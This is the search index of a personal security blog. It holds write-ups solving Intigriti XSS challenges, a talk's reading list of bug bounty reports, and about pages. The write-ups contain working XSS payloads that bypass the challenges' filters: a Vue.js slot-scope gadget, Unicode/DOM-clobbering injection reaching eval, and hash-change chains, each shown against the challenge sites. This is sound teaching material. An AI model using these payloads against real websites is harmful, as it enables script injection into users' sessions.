[{"categories":["Challenges"],"content":"Intigiriti‚Äôs November challenge by IvarsVids was about a Vue.js one-pager that reflected user input with some replacements. After visiting the challenge homepage at https://challenge-1121.intigriti.io/ we quickly notice it reflects s query parameter not escaping HTML less than and greater than signs resulting in HTML injection. s parameter reflections parameter reflection \" s parameter reflection But the page refuses the execute the injected script because of the content security policy base-uri 'self'; default-src 'self'; script-src 'unsafe-eval' '\u003cemitted\u003e' 'strict-dynamic'; object-src 'none'; style-src '\u003cemitted\u003e' CSP blockingCSP blocking \" CSP blocking As we see unsafe-eval directive is present, which means dynamically eval‚Äôed script will be allowed, so we can try vue.js template injection. To achieve that we should inject our element with app ‚Äúid‚Äù, close the \u003ctitle\u003e with a payload like \u003c/title\u003e\u003cdiv id=app\u003e\u003c/div\u003e and inject the payload within the div. Template delimiters are set to v-{{ and }} on line 45 but after trying to inject templates or general script gadgets from Portswigger‚Äôs cheatsheet the WAF is replacing keywords with % characters. replacing keywordsreplacing keywords \" replacing keywords Looking for a potential execuntion sink I refered to Vue api at https://vuejs.org/v2/api/ and found slot-scope deprecated special attribute which is expecting function argument expression. Trying to inject payload like \u003c/title\u003e\u003cdiv id=app\u003e\u003cp slot-scope=\"function(){alert()}\"\u003e\u003c/div\u003e we get the following expection. thrown exceptionthrown exception \" thrown exception So to execute javascript we should close the function expression and then execute our javascript code, but also please note the injection point is within a smaller scope and window parameters are not within this scope. To escape to window scope we can try the classic this.constructor.constructor chain. Injecting a payload like the following we get another exception\u003c/title\u003e\u003cdiv id=\"app\"\u003e\u003cp slot-scope=\"){}}])-this.constructor.constructor('alert(origin)')()})};//\"\u003e\u003c/div\u003e thrown exception 2thrown exception 2 \" thrown exception 2 WAF has replaced is from this with %is% as it is another known script gadget attribute, but we can bypass this using a function from the local scope, e.g. \u003c/title\u003e\u003cdiv id=\"app\"\u003e\u003cp slot-scope=\"){}}])-_c.constructor.constructor('alert(origin)')()})};//\"\u003e\u003c/div\u003e successfull executionsuccessfull execution \" successfull execution For the intended solution check Intigriti‚Äôs guide at https://www.youtube.com/watch?v=-_7uL7l0qZk. ","date":"22-11-2021","objectID":"/2021/11/vuejs-script-gadget-intigriti/:0:0","tags":["web security","script gadget","xss","intigriti","vuejs"],"title":"From Intigriti challenge to a Vue.js script gadget","uri":"/2021/11/vuejs-script-gadget-intigriti/"},{"categories":["Challenges"],"content":"This month‚Äôs challenge, made by Holme, was a little bit different than the ones I have previously solved as it had a server-side processing issue. Vulnerable page - https://challenge-0221.intigriti.io/ Vulnerable script - https://challenge-0221.intigriti.io/script.js ","date":"22-02-2021","objectID":"/2021/02/intigriti-february-xss-challenge/:0:0","tags":["challenge","xss","intigriti","unicode","eval","DOM clobbering"],"title":"Intigriti's February XSS Challenge Writeup","uri":"/2021/02/intigriti-february-xss-challenge/"},{"categories":["Challenges"],"content":"Issue 1 - Unicode characters improper processing Digging into the embedded script (see the code below) we can see there is no direct source that could reach the only dangerous sink (eval) at line 57: function startGrade() { var text = document.getElementById(\"assignmentText\").value; checkLength(text); result = window.result || { message: \"Your submission is too short.\", error: 1, }; //If the result object hasn't been defined yet, the submission must be too short if (result.error) { endGrade(); } else { getQAnswer(); if (!passQuiz()) { result.message = \"We don't allow robots at the Unicodeversity (yet)!\"; result.error = 1; } else { result.grade = \"ABCDEF\"[Math.floor(Math.random() * 6)]; //Don't tell the students we don't actually read their submissions } endGrade(); } } function endGrade() { document.getElementById(\"message\").innerText = result.message; if (result.grade) { document.getElementById( \"grade\" ).innerText = `You got a(n) ${result.grade}!`; } document.getElementById(\"share\").style.visibility = \"initial\"; document.getElementById( \"share-link\" ).href = `https://challenge-0221.intigriti.io/?assignmentTitle=${ document.getElementById(\"assignmentTitle\").value }\u0026assignmentText=${document.getElementById(\"assignmentText\").value}`; delete result; } function checkLength(text) { if (text.length \u003e 50) { result = { message: \"Thanks for your submission!\" }; } } function getQAnswer() { var answer = document.getElementById(\"answer\").value; if (/^[0-9]+$/.test(answer)) { if (typeof result !== \"undefined\") { result.questionAnswer = { value: answer }; } else { result = { questionAnswer: { value: answer } }; } } } function passQuiz() { if (typeof result.questionAnswer !== \"undefined\") { return eval(result.questionAnswer.value + \" == \" + question); } return false; } var question = `${Math.floor(Math.random() * 10) + 1}+ ${ Math.floor(Math.random() * 10) + 1 }`; document.getElementById(\"question\").innerText = `${question}= ?`; document.getElementById(\"submit\").addEventListener(\"click\", startGrade); const urlParams = new URLSearchParams(location.search); if (urlParams.has(\"autosubmit\")) { startGrade(); } It is a common behavior for web apps to reflect an input‚Äôs name or id if provided via request body or query string, so does this app (escaping, unfortunately). Escaped reflected parameterEscaped reflected parameter \" Escaped reflected parameter But if we try a Unicode sequence (’¢’°÷Ä÷á), we can see it doesn‚Äôt get processed normally. Unicode reflected parameterUnicode reflected parameter \" Unicode reflected parameter The first part of a Unicode character byte pair gets rendered and the second pair is getting reflected as is, for example, in the case of letter ’¢ (U+0562), 05 gets rendered and 62 is being returned. ","date":"22-02-2021","objectID":"/2021/02/intigriti-february-xss-challenge/:0:1","tags":["challenge","xss","intigriti","unicode","eval","DOM clobbering"],"title":"Intigriti's February XSS Challenge Writeup","uri":"/2021/02/intigriti-february-xss-challenge/"},{"categories":["Challenges"],"content":"Issue 2 - DOM clobbering as a source to the dangerous sink Now we can escape the reflection point with a doublequote using some character like ‚àÄ (U+2200), but we cannot use event handlers because of CSP nor can construct an inline script element as we cannot guess a server-generated nonce value. script-src 'strict-dynamic' 'nonce-iR/JMMPv7suDLRND7rsPGvDzJxU=' 'unsafe-eval' http: https:;object-src 'none';base-uri 'none'; As said above, looking for DOM vulnerabilities, the only usable sink is eval (at line 56 in the original script) in passQuiz function. function passQuiz() { if (typeof result.questionAnswer !== \"undefined\") { return eval(result.questionAnswer.value + \" == \" + question); } return false; } And to reach it we should be able to control either result.questionAnswer.value or question variable. No source reaches question, but in line 4 we can see that result can be taken from the window object. function startGrade() { var text = document.getElementById(\"assignmentText\").value; checkLength(text); result = window.result || { message: \"Your submission is too short.\", error: 1, So to set its value we should abuse DOM clobbering. And the rendered payload should look something like this \u003celem id=\"result\"\u003e \u003celem id=\"result\" name=\"questionAnswer\" value=\"alert(origin)//\"\u003e Looking through MDN documentation, the only usable element that has value attribute is \u003cdata\u003e as only its first two letters (da) can be embedded as a hexadecimal value to start a tag normally instead of a gibberish. Finally we can construct our payload ?assignmentTitle=‚àÄ„∏Ä„≥öta%20id=result„∏Ä„≥öta%20id=result%20name=questionAnswer%20value=alert(origin)//\u0026autosubmit ‚àÄ (U+2200) to render a doublequote (\"), „∏Ä (U+3E00) to render a greater than sign (\u003e), „≥ö (U+3CDA) to render a less than sign (\u003c) and reflect DA characters to start the \u003cdata\u003e tag, and autosubmit query parameter to execute startGrade function without user interaction (line 71). Which should result in something like this being injected into the page \"00\u003e00\u003cdata id=result\u003e00\u003cdata id=result name=questionAnswer value=alert(origin)// Pop the alertPop the alert \" Pop the alert The final URL - https://challenge-0221.intigriti.io/?assignmentTitle=‚àÄ„∏Ä„≥öta%20id=result„∏Ä„≥öta%20id=result%20name=questionAnswer%20value=alert(origin)//\u0026autosubmit ","date":"22-02-2021","objectID":"/2021/02/intigriti-february-xss-challenge/:0:2","tags":["challenge","xss","intigriti","unicode","eval","DOM clobbering"],"title":"Intigriti's February XSS Challenge Writeup","uri":"/2021/02/intigriti-february-xss-challenge/"},{"categories":["Conferences"],"content":"At this year‚Äôs Armsec seventh annual information security conference - reARMSEC, I made a small presentation (Google slides, PDF version) on why the modern web is hard describing HackerOne‚Äôs top 10 most impactful and rewarded vulnerability types for 2020. As for the real-life examples of the bugs, I gathered reports mostly from HackerOne‚Äôs Hacktivity. XSS (Cache Poisoning): HackerOne report #394016, XSS on Discourse by Sergey Bobrov HackerOne report #415168, XSS on QIWI by Sergey Bobrov XSS (DOM): XSS on Google Search (closure), mXSS by Masato Kinugawa serialization bug in \u003cnoscript\u003e by Micha≈Ç Bentkowski HackerOne report #876148, DOM XSS on DuckDuckGo by Predrag Cujanoviƒá uXSS: Semi Universal XSS affecting Firefox for iOS, CVE-2019-17004 by Cliqz uXSS in Chrome on iOS, CVE-2018-6128 by Tomasz Bojarski Electron: Microsoft Teams zero click xss by Oskars Vegeris Discord RCE by Masato Kinugawa (not in slides, but definitely a must read) AAA vulnerabilities: Exploiting e-mail systems by Inti De Ceukelaire HackerOne report #493324, privilege escalation to gitlab admin by Anton Subbotin Facebook Access Token Security Breach (30 million accounts) by üëª HackerOne report #605720, vertical privilege escalation on HackerOne by Vladimir Metnew HackerOne report #663431, IDOR on HackerOne by Jobert Abma Facebook account takeover via recovery code bruteforce by Anand Prakash Information Disclosure: HackerOne report #396467, Snapchat‚Äôs github token leaked publicly by Majd HackerOne report #885539, Twitter private list members disclosure via GraphQL by RyotaK HackerOne report #489146, confidential data of users and limited metadata of programs and reports accessible via GraphQL on HackerOne by Yash Sodha (not in slides, but definitely a must read) SSRF: HackerOne report #347139, LFI and SSRF via XXE on Rockstar Games by Alex Birsan HackerOne report #923132, redirect SSRF on Dropbox by Sayaan Alam HackerOne report #541169, SSRF via DNS rebinding on Gitlab by Alex Chapman HackerOne report #530974, Server-Side Request Forgery using Javascript on Snapchat by Ben Sadeghipour CSRF: HackerOne report #1010522, TikTok Careers Portal Account Takeover via CSRF by Lauritz SSTI: HackerOne report #125980, RCE via Flask Jinja2 Template Injection on Uber by Orange Tsai Insecure Deserialization: RCE on Facebook by Orange Tsai SQL injection: HackerOne report #137956, Error based SQL injection on Mail.ru by Vahagn Israelian HackerOne report #10037, Boolean based SQL injection on Mail.ru by Vahagn Vardanian HackerOne report #786044, Time based SQL injection on Mail.ru by Austin Augie HackerOne report #852306, SQLI Wildcard Injection on Mail.ru by Alexey (bazzy) To learn more (I‚Äôll try to update this list constantly): Books - Web Application Hacker‚Äôs Handbook, Web Hacking 101, The Tangled Web, The Art of Software Security Assessment Writeups - HackerOne‚Äôs Hacktivity, bugcrowd‚Äôs CrowdStream, CTFtime.org writeups Labs - PortSwigger Web Security Academy, TryHackMe, hackxor, OverTheWire: Wargames Follow these people/pages - https://twitter.com/davwwwx/following ","date":"27-12-2020","objectID":"/2020/12/armsec-2020/:0:0","tags":["web security","bug bounties","hackerone","owasp","top 10","conferences"],"title":"Web is hard, reARMSEC aka ARMSec 2020","uri":"/2020/12/armsec-2020/"},{"categories":["Challenges"],"content":"This month‚Äôs Intigriti‚Äôs XSS challenge was interesting as a couple of hours after Frans Ros√©n submitted an unintended solution, and I got interested in that one more than in the original. Unintended SolutionUnintended Solution by Frans Rosen \" Unintended Solution Challenge on webarchive https://web.archive.org/web/20201208103813/https://challenge-1220.intigriti.io/. Vulnerable script on webarchive https://web.archive.org/web/20201210000939/https://challenge-1220.intigriti.io/script.js. ","date":"14-12-2020","objectID":"/2020/12/intigriti-december-xss-challenge/:0:0","tags":["challenge","xss","intigriti","eval","unintended"],"title":"Intigriti's December XSS Challenge Writeup","uri":"/2020/12/intigriti-december-xss-challenge/"},{"categories":["Challenges"],"content":"Solution 1 Parsing query parameters using custom function (e.g. getQueryVariable, line 3) allows to specify those in URL hash on line 11 (below) window.location.href.substr(...), as String.prototype.indexOf() is looking for the first occurance of ? (question mark): function init(){ try{ document.getElementById(\"result\").value = calc(getQueryVariable(\"num1\"), getQueryVariable(\"num2\"), getQueryVariable(\"operator\")); } catch(ex){ console.log(ex); } } ... function getQueryVariable(variable) { window.searchQueryString = window.location.href.substr(window.location.href.indexOf(\"?\") + 1, window.location.href.length); var vars = searchQueryString.split('\u0026'); var value; for (var i = 0; i \u003c vars.length; i++) { var pair = vars[i].split('='); if (decodeURIComponent(pair[0]) == variable) { value = decodeURIComponent(pair[1]); } } return value; } Two of the sources (num1 and num2) are passed to setNumber function (line 23) when clicking on a number, which itself then passes it to parseInt (lines 101, 104), also there is no protection against iframing it, so, having such URL https://challenge-1220.intigriti.io/#?num1=parseInt\u0026operator=%3d\u0026num2=eval in an iframe, we can execute parseInt=eval as operation in the context of the vulnerable webpage, because = is whitelisted as an operator: const operators = [\"+\", \"-\", \"/\", \"*\", \"=\"]; function calc(num1 = \"\", num2 = \"\", operator = \"\"){ operator = decodeURIComponent(operator); var operation = `${num1}${operator}${num2}`; document.getElementById(\"operation\").value = operation; if(operators.indexOf(operator) == -1){ throw \"Invalid operator.\"; } if(!(/^[0-9a-zA-Z-]+$/.test(num1)) || !(/^[0-9a-zA-Z]+$/.test(num2))){ throw \"No special characters.\" } if(operation.length \u003e 20){ throw \"Operation too long.\"; } return eval(operation); } ... window.onload = function(){ init(); var numberBtns = document.body.getElementsByClassName(\"number\"); for(var i = 0; i \u003c numberBtns.length; i++){ numberBtns[i].onclick = function(e){ setNumber(e.target.innerText) }; }; var operatorBtns = document.body.getElementsByClassName(\"operator\"); for(var i = 0; i \u003c operatorBtns.length; i++){ operatorBtns[i].onclick = function(e){ setOperator(e.target.innerText) }; }; var clearBtn = document.body.getElementsByClassName(\"clear\")[0]; clearBtn.onclick = function(){ clear(); } } ... function setNumber(number){ var url = new URL(window.location); var num1 = getQueryVariable('num1') || 0; var num2 = getQueryVariable('num2') || 0; var operator = getQueryVariable('operator'); if(operator == undefined || operator == \"\"){ url.searchParams.set('num1', parseInt(num1 + number)); } else if(operator != undefined){ url.searchParams.set('num2', parseInt(num2 + number)); } window.history.pushState({}, '', url); init(); } Now we can redirect the iframe to a new hash https://challenge-1220.intigriti.io/#?num1=parseInt\u0026operator=%3d\u0026num2=alert(document.domain)// and as, only, the URL hash is changed, no request is going to be sent to the server and if the user hits any number, the following script will be executed alert(document.domain)//\u003cnumber\u003e. A similar technique can be leveraged when having calc=eval executed then redirecting to a new hash https://challenge-1220.intigriti.io/#?num1=alert(document.domain)\u0026operator=%3d\u0026num2=eval, where the user has to hit an operator POCs: for numbers - https://jsfiddle.net/td6yzm0w/1/ for operators - https://jsfiddle.net/td6yzm0w/ Intigriti tip tweetIntigriti tip tweet \" Intigriti tip tweet ","date":"14-12-2020","objectID":"/2020/12/intigriti-december-xss-challenge/:0:1","tags":["challenge","xss","intigriti","eval","unintended"],"title":"Intigriti's December XSS Challenge Writeup","uri":"/2020/12/intigriti-december-xss-challenge/"},{"categories":["Challenges"],"content":"Solution 2 Now the intended one, that leads to DOM XSS (Cross site swagging) with no user interaction. Intigriti tip tweetIntigriti tip tweet \" Intigriti tip tweet Very right, because getQueryVariable iterates in a loop and takes the value of the last occurrence of the requested parameter (lines 5-10) function getQueryVariable(variable) { window.searchQueryString = window.location.href.substr(window.location.href.indexOf(\"?\") + 1, window.location.href.length); var vars = searchQueryString.split('\u0026'); var value; for (var i = 0; i \u003c vars.length; i++) { var pair = vars[i].split('='); if (decodeURIComponent(pair[0]) == variable) { value = decodeURIComponent(pair[1]); } } return value; } Chain: https://challenge-1220.intigriti.io/?num1=onhashchange\u0026operator=%3d\u0026num2=init\u0026#d\u0026 - execute onhashchange=init https://challenge-1220.intigriti.io/?num1=onhashchange\u0026operator=%3d\u0026num2=init\u0026#d\u0026num1=calc\u0026num2=eval - changing hash, triggering onhashchange which is init now and executing calc=eval https://challenge-1220.intigriti.io/?num1=onhashchange\u0026operator=%3d\u0026num2=init\u0026#d\u0026num1=calc\u0026num2=eval\u0026num1=alert(‚Äòachievement%20unlocked:%20unlimited%20swag%20vouchers%20‚Äô%2bdocument.domain) - triggering onhashchange and passing alert('achievement unlocked: unlimited swag vouchers '+document.domain) to eval Now you can claim your unlimited swag voucher with 0 click: Pop an alertPop an alert \" Pop an alert POC: https://jsfiddle.net/vsz08bpo/ ","date":"14-12-2020","objectID":"/2020/12/intigriti-december-xss-challenge/:0:2","tags":["challenge","xss","intigriti","eval","unintended"],"title":"Intigriti's December XSS Challenge Writeup","uri":"/2020/12/intigriti-december-xss-challenge/"},{"categories":["Misc"],"content":"Hi, I am a web application developer and cybersecurity enthusiast from Armenia. On this blog, I am going to post mainly Bug bounty and CTF writeups, reconnaissance techniques, approaches to pentesting and my thoughts on general infosec. Stay tuned for more. ","date":"15-09-2020","objectID":"/2020/09/what-is-this-blog-about/:0:0","tags":["about","blog"],"title":"What is this blog about","uri":"/2020/09/what-is-this-blog-about/"},{"categories":null,"content":"poke ¬†Telegram @davwwwx ¬†Twitter @davwwwx ¬†Github @davwwwx ","date":"15-09-2020","objectID":"/about/:0:0","tags":null,"title":"about:blank","uri":"/about/"}]